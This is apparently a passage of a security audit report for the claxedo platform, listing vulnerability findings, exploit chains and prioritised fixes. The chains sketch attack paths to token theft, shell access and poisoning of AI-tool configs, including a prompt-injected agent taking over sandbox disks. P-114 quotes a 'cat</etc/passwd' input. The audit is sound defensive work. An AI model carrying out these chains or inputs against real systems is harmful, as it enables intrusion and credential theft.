| P-109 | MED | claxedo-server (embedded auth) | **Device-code claim+approve cookie-authenticated, CSRF-passable — zero clicks.** `POST /device/code` anonymous → `GET /api/auth/device?user_code=` claims the code to the victim's session (a GET — `<img>`/navigation suffices) → `POST /device/approve` → attacker polls `oauth2/token` → victim-scoped CP tokens. Hosted is safe (exact `trustedOrigins` + `browserAuthHttpSecurity`); embedded over http has neither. | `device-login.test.ts:85-139` (behavior); `embedded-auth.ts:124-133` |
| P-110 | MED-LOW | claxedo-server (hosted) | **`/api/auth/*` dispatched before `defaultRequestGuard`; better-auth's limiter keys on leftmost `x-forwarded-for` (client-controlled on CF)** → unlimited keys for credential stuffing, unauthenticated `oauth2/register` (D1 writes), outbound emails. Fix: `cf-connecting-ip` header config + guard ahead of dispatch. | `better-auth-d1-candidate-worker.cf.ts`; `hosted-core-app.ts:230-241` |
| P-111 | MED | workspace-runtime | **Open SSE stream survives member removal indefinitely on the embedded arm** — the self-hosted policy admits the unscoped arm by stamped role with no lease ("keeps session-less frames until the connection closes" — `events.ts:362-365`). Membership revocation never takes effect on an open stream; pty/lifecycle frames included. Relay path terminates at renewal. | `events.ts:362-365`; `event-delivery.ts:233-264` |

### Third-pass findings — LOW / informational

| ID | Sev | Surface | Finding | Evidence |
|----|-----|---------|---------|----------|
| P-112 | LOW | channels | Pairing admin bearer `===` compare (siblings are timing-safe); unsigned-nonloopback-allowlisted prefix. | `channels/control-plane.ts:636-640` |
| P-113 | LOW | claxedo-server | `POST /api/claxedo/track` unauthenticated on signed nodes — remote analytics poisoning (S-8's remote surface). | `app.ts:1057-1073` |
| P-114 | LOW | workspace-runtime | `commandPathPattern` omits `<>{}!` prefixes — `cat</etc/passwd` escapes command-path confinement (contract claims escapes rejected). | `target.ts:143` |
| P-115 | LOW | workspace-runtime | Hook-token non-capability branch allows writes for nonexistent/unowned terminals. | `agent-hook.ts:453-468` |
| P-116 | LOW | workspace-runtime | `WORKSPACE_RUNTIME_MANAGEMENT_JWKS_URL` accepts `http:` — cleartext JWKS anchor (http: theme). | `management-auth.ts:83-84` |
| P-117 | LOW | workspace-runtime | `WorkspaceRuntimeRoutes` manifest misses document/broker/root-file mounts — no guard that every registered route sits behind auth middleware. | `manifest.ts:3-19`; `server.ts:513,537-548` |
| P-118 | LOW-MED | claxedo-server | Viewer-role member wakes cloud sandboxes (`GET /:id/connection` → `hostManager.ensure`) — compute spend at read-only. | `runtime-token-guards.ts:56-76`; `hosted-connection-info.ts:109` |
| P-119 | LOW | billing | `subscription.*` webhook `source_ts` falls back to `Date.now()` — stale signed event can clobber newer mirror state. | `apply-polar-state.ts:187` |
| P-120 | LOW | claxedo-server-core | Node KV backend collapses per-org envelope partition to `"deployment"` (single-tenant assumption). | `backend-registry.ts:26-44` |
| P-121 | LOW | claxedo-server-core | Local credential store doesn't chmod/length-check a pre-existing seed/dir (broker does). | `backends/local.ts:66-82` |
| P-122 | INFO | claxedo-server | Self-host connection turn-credential mint is dead code — signed-owned connections can't vend tokens (fail-closed gap). | `app.ts:868-898`; `turn-credentials.ts` |
| P-123 | LOW-MED | claxedo-mcp | `mcp_loopback_only` is a Host/Origin check, not a socket-peer check — remotely reachable on the runtime mount with a leaked trusted-direct token (compounds H-1). | `claxedo-mcp/src/endpoint/loopback.ts:9-24` |
| P-124 | LOW | claxedo-server | Signed-node MCP in-process `local` fetch carries no bearer → `requireRelayActor` 503s (fail-closed availability). | `app.ts:771-867,1340-1346` |
| P-125 | LOW | claxedo-server-core | `resolveWorkspace` falls back to `directory` when a supplied `workspaceId` is unknown → stale-credential cross-workspace dispatch. | `store/index.ts:691-704` |
| P-126 | LOW (latent) | workspace-relay | Resolver `upstreamHeaders` applied *after* the RHT stamp — could overwrite `Authorization` (only producer today is `daytona.previewToken`). | `server.ts:747-762` |
| P-127 | LOW-MED | workspace-relay | No scheme restriction on resolver `baseUrl` — `http:` leaks the RHT; non-http(s) = SSRF carrying a minted credential. | `server.ts:53-68,766`; `bun.ts:1151` |
| P-128 | LOW-MED | workspace-relay (CF) | Anonymous `?region=`/`x-claxedo-workspace-region` permanently pins a workspace's DO to an attacker-chosen region (griefing; DO location never migrates). | `cloudflare.ts:983-1016` |
| P-129 | LOW | workspace-relay | Bun cloud-direct WS legs have no send-buffer guard; pending cap counts started SSE streams (starves tunnel HTTP at 32). | `bun.ts:975,1897,2015` |
| P-130 | LOW | workspace-relay | `setTimeout` overflow on far-future `exp` closes sockets instantly. | `bun.ts:1293-1297` |
| P-131 | LOW-MED | claxedo-local-server | Daemon-side git ops run with full env → repo hooks/`core.fsmonitor` execute with `CLAXEDO_DAEMON_TOKEN`/`CLAXEDO_CREDENTIALS_TOKEN` ambient (P-62 class, daemon side + config trigger). | `local-documents.ts:22-27`; `git-authority.ts:154-186` |
| P-132 | LOW-MED | claxedo-local-server | Agent-config GETs create workspaces/spawn runtimes via `?directory=`; loopback `sandboxFetch` mints `role:"owner"` for caller-named dirs. | `agent-config/routes/index.ts:51`; `sandbox-fetch-options.ts:39-49` |
| P-133 | LOW | workspace-runtime | `/api/wr/documents/:sid/:did/activate` + GET consume the *stored* job token — viewer can activate/observe hydrated paths. | `document-hydration.ts:276-375` |
| P-134 | LOW | workspace-runtime | Identifier-less `agent.lifecycle` frames admitted by `ownsControlFrames` → `transcriptPath`/`providerSessionId` leak workspace-wide (not marked `sensitive`). | `events.ts:227-231,440-442` |
| P-135 | LOW | workspace-runtime | `prompt_async` marks `body.messageID` before lease acquisition → pending-id preemption (narrow). | `session-core.ts:2129-2134` |
| P-136 | LOW | claxedo-server | Cookie+bearer ambiguity never actually rejected on embedded — comment claims a refusal no code path implements. | `embedded-browser-auth.ts:111-120` vs `authentication.ts:565-573` |
| P-137 | LOW-MED | claxedo-server | Daytona env sets `WORKSPACE_RUNTIME_HOST_ID` to provider UUID ≠ `lease.hostId` → all relay requests denied (fail-closed correctness bug; also makes the UUID ambient-readable). | `supervisor/sandbox.ts:524` |
| P-138 | INFO | claxedo-server-core | Dead weaker D1 token methods on `D1HostAccessAuthority` (omitted from bound methods; dangerous if ever bound); lax sqlite `recordRuntimeAccessTokenForService`. | `host-access-authority.ts:1373-1493`; `workspace-authority.ts:2754-2791` |
| P-139 | LOW | claxedo-server (hosted) | `session.share.changed` doorbells dropped — `ownerUserId` stamps IdP subject, visibility compares `usr_…` (fail-closed notification loss). | `session-people-contract.ts:105-124`; `event-visibility.ts:68-71` |
| P-140 | INFO | claxedo-mcp | OAuth `aud` check presence-conditional; `permissionMode` claim never minted/verified (both fail-safe). | `oauth-credential.ts:96`; `credential.ts:74-121` |

### Prior findings — status this pass

- **Still present:** H-1 (config token = same value, ambient; P-85/P-86 compound it), H-2, H-3 (P-98 shows revocation itself isn't sticky), P-57 premise (mitigated for shell paths — P-90 enumerates what the gate doesn't cover), P-58/P-63 (regression-suspect vs remediation header), P-59, P-60 (P-86 adds the snapshot/restore payload), P-61, P-62 (P-131 is the daemon-side sibling), P-70 (narrowed by `projectEnvProblem` name rules), P-76, R-1/R-2/R-3.
- **Resolved / gone:** P-75 (OAuth pending keyed `(org,providerId)`), H-4's code path (`resolveSecretsForScope` removed; successor fails closed for delivery), hosted `/runtime/register|heartbeat` lease mutation (hosted routes discard the body — P-86 is self-host only).
- **S-4 resolved:** chat SDK enforces webhook secrets per request + fail-loud boot warning; unresolved sender repos fail closed.

### Deep exploit chains (end-to-end verified)

1. **Anonymous → all tenants' secrets (P-81):** one `PUT /signed-runtime` → attacker command as the node process → issuer secret + EdDSA keys + credentials KEK → mint any account's tokens + decrypt the whole store. No second exploit needed.
2. **Browser tab → shell + host identity + cross-app persistence (P-84 + P-82):** localhost page → `PUT /host-serving` {attacker relayUrl, arbitrary token} → daemon dials out → attacker replays as loopback → PTY shell → credential seed, daemon token, host P-256 key (durable; sqlite beats don't need fresh signatures — P-101) → `mcp-install` poisons `~/.claude.json`/`.cursor`/`CODEX_HOME` — survives uninstall.
3. **Prompt-injected agent → every sandbox's disk (P-86):** ambient config token → `runtime/register` rewrite own lease `sandboxId`→victim's deterministic id + `url`→attacker (epoch omitted → fence passes) → idle `stopSandbox` → `driver.snapshot(victim)` → restore boots from victim image → victim's creds + token → repeat fleet-wide. Supervisor lifecycle does the exfil; no human click.
4. **Viewer member → owner's screen/sessions/shell (P-83 + P-82 + P-89):** `GET /api/wr/events` → 16 KB terminal snapshots + private sessions + all machine projects; editor → pty attach → keystrokes into owner's shell → host key → durable machine access.
5. **Removed member keeps open SSE arm indefinitely (P-111)** — embedded unscoped arm has no lease; revocation never lands until disconnect.
6. **One env var = skeleton key (`externalConfigToken`):** `WORKSPACE_RUNTIME_CONFIG_TOKEN` on the node makes one token authenticate `/api/control` mutations for *every* workspace — converts Chain 3's single-workspace leak into fleet-wide reach with no determinism needed.
7. **Cross-workspace transcript read (P-94):** ws-A config token → session-pull fetches ws-B session messages into A's projection → read via normal A routes.
8. **Zero-click token theft (P-109 + P-108):** localhost page → anonymous `device/code` → claim via GET + approve via cookie-CSRF → victim's CP tokens → replay everywhere.

**Checked and rejected (no overclaim):** lease rewrite → SBT theft — SBT binds the lease's own `ws.id`, dead against the victim (`control-token.ts:43-56`); tunneled member → cloud owner-mint — unreachable (desktop has no `relayProvider`/`sandboxManager`; node sets `requireRelayActor`); `connectRemoteWorkspacePty` — forwards no auth, upstream rejects (broken feature); session-pull secret *values* — `shared` scope projects brokered references only.

### Verified non-findings (third pass)

JWT alg/iss/aud/`exp`/`jti` pinning on all 7 token classes; RHT→parent-RAT revocation rechecked live; delegated runtime access revalidated per dispatch+renewal (`machine-dispatch.ts`, `runtime-session-authority.ts`); `resolveWorkspacePath` realpath+symlink confinement; runtime PTY route authz + rolling leases; identity-aware event delivery (per-session leases, renewal, actor-scoped creator frames); channel authority checks + signed pairing claim; egress broker (token binding, https-only, allowlists, redirect refusal); billing webhooks (Standard-Webhooks HMAC, dedup, ±5min window); entitlement fail-closed; host enrollment (invitation hash+single-use, P-256 attestation, generation fencing, revocation cascade); workerd composition (origin-pinned entry, loopback guard fails closed, cookie posture, evidence rows, DO isolation); MCP (timing-safe HMAC, credential-keyed sessions, composition-fixed tool groups, cross-workspace write deny, no OAuth→CP promotion); document capability scope binding + CAS + containment.

### Open verification items

1. Does the embedded engine resolve custom-provider `env` names against `process.env` (P-99's last hop)?
2. Relay `activeHost` tunnel-vs-lease preference for `RELAY_WORKSPACE_IDS` injection (project-env override residual).
3. Do sandbox providers forward client `Host` (P-123 precondition)?
4. Does the paid product compose tasks routes (P-97's billing half)?
5. Behavioral repros: P-103 (`read`-scoped token + `if-match` on `PUT /:id`), P-87 (existing-branch rollback delete), P-93 durable-sync stall.
6. Whether the same-day P-58/P-63 fixes regressed or landed in files the agents re-checked (header claims vs current source disagree).



| Package | Status | Headline result |
|---------|--------|-----------------|
| agent-event-runtime | ✅ audited | P-5 forged subagent bindings (MED→HIGH), P-22, P-39 |
| agent-runtime-contract | ✅ audited | P-40 (prototype lookups, partial validators) — LOW |
| agent-sdk-runtime | ✅ audited | **P-1, P-2** — env leaks to harness children (HIGH×2); P-32, P-33 |
| claxedo-app | ✅ audited | S-2 confirmed; P-23, P-25, P-31 |
| claxedo-channels | ✅ audited | **P-4** Telegram unverified-webhook (MED-HIGH); P-21, P-27, P-55 |
| claxedo-connections | ✅ audited | P-41 — LOW cluster |
| claxedo-desktop | ✅ audited | P-6–P-9 (MED cluster: WSL injection, store traversal, interpreter allowlist, update channel); P-26, P-51 |
| claxedo-docs | ✅ audited | **Package removed** (Mintlify → `public-docs/`); successor docs clean |
| claxedo-documents-service | ✅ audited | Fail-closed scaffold; P-50 forward-looking |
| claxedo-helpers | ✅ audited | Primitives verified strong; P-46 LOW cluster |
| claxedo-host-connector | ✅ audited | **P-3** no TLS on control plane (HIGH-cond); P-12, P-29 |
| claxedo-host-serving | ✅ audited | **P-61** `..` escape off workspace prefix (HIGH); P-77 |
| claxedo-local-server | ✅ audited | **P-57** signed auth-without-authz (CRITICAL); P-63–P-66, P-72–P-76 |
| claxedo-mcp | ✅ audited | P-10, P-11 (MED), P-36 |
| claxedo-server-core | ✅ audited | **P-57** (co-owner), P-58 (HIGH), P-67 |
| claxedo-server | ✅ audited | P-60 (co-owner), P-67, P-72 |
| claxedo-service-contract | ✅ audited | Contracts-only; P-52 |
| claxedo-tasks | ✅ audited | P-16 (MED DoS), P-44 |
| claxedo-telemetry | ✅ audited | P-19 (MED), P-37; zero prod importers today |
| claxedo-web | ✅ audited | Static site, clean; P-47 |
| cli | ✅ audited | P-22 (MED Windows cmd injection), P-43 |
| egress-broker | ✅ audited | No egress bypass found; P-35, P-56 |
| opencode-server-adapter | ✅ audited | P-42 LOW cluster |
| sandbox-contract | ✅ audited | P-28 fail-open broker check; P-30 |
| sandbox-manager | ✅ audited | **P-60** lease-target hijack (HIGH); P-70, P-71, P-75 |
| script/ | ✅ audited | P-49 supply-chain (base-image bake) |
| session-app | ✅ audited | **Stub package** — no source; P-80 |
| session-ui | ✅ audited | P-68 (MED javascript: sinks), P-79 |
| storybook | ✅ audited | Dev-only; P-48 |
| ui | ✅ audited | P-69 (MED marked link renderer), P-78 |
| usage-contract | ✅ audited | Types-only; P-52 |
| wakes | ✅ audited | P-17, P-18 (MED), P-45, P-53 |
| workspace-relay-protocol | ✅ audited | P-20 (MED), P-38 |
| workspace-relay | ✅ audited | P-13, P-14, P-15 (MED), P-34 |
| workspace-runtime | ✅ audited | **P-62** git-hook env leak (HIGH); P-64, P-74 |

## Priority order

1. **P-57 — signed self-hosted authN≠authZ (CRITICAL).** Gate `ShellRoutes` on workspace authority (`authority.openWorkspace` + role) and drop the `input.directory` fallback root; restrict worktree delete/reset to registered worktree rows; gate `startCommand` behind admin/owner. Same change closes P-59's project/worktree surface and most of P-63/P-65/P-66/P-73. One composition decision fixes the class.
2. **P-58** — apply `isLoopbackLocalRequest` to `discover`/`save-discovered`/`sync-local` (siblings already do this).
3. **P-1 + P-2 + H-1 + P-62 (one fix class) — secret env leaks to children.** Replace `INTERNAL_SECRET_ENV` with `pty/env.ts`'s model (deny `CLAXEDO_*`/`WORKSPACE_RUNTIME_*` + secret-suffix backstop), route Pi through it, and run `runGit` under `buildSafeEnv`. Repo-scanning test asserting no secret-shaped name survives.
4. **P-60** — stop accepting `sandboxId`/`url`/`hostId`/`driverResourceId` from runtime snapshots (reject mismatches, `409`); drop or per-workspace-scope `externalConfigToken()`.
5. **S-1** — pin local-server CORS to known app origins and/or require the daemon token on file/pty/mutating routes.
6. **P-4** — drop or map `CLAXEDO_CHANNEL_TELEGRAM_WEBHOOK_SECRET_TOKEN`; extend the boot warning beyond `0.0.0.0` binds.
7. **P-61** — build the relayed URL from the same normalized path used for the deny check; deny any path containing `.`/`..` segments. Mirror fix in `user-hosted-tunnel.ts`.
8. **P-3 + P-12 + http: theme** — deploy `requireHttpsUrl` at every credential-bearing boundary (host-connector control plane + endpoints, introspection/JWKS, worker_url, adapter baseUrl, CLI config).
9. **S-2 + P-68 + P-69 (one fix class) — renderer injection.** Mermaid → `sanitizeSvg`; file-part/webfetch `href` → `transcriptLinkHref` gate (and `preventDefault` on unrecognized schemes); marked link renderer → escape `href`/`title` + scheme filter.
10. **P-6/P-7/P-8** — desktop IPC: kill the `sh -lc` wsl-path, constrain store names to basenames, remove interpreters from the open-in allowlist.
11. **P-10/P-11** — MCP: require `ctx.elicit` for destructive tools; scope runtime `session_send`/`session_abort` to own-children.
12. **P-9** — separate beta/prod update channels; `allowDowngrade:false`.
13. **P-67** — normalize IPv6-embedded/decimal/octal hosts and add missing ranges (CGNAT, 198.18/15) to `isPrivateAddress`; apply at load/forward too.
14. **R-1, M-1, H-2, P-16, P-63** — as previously listed.
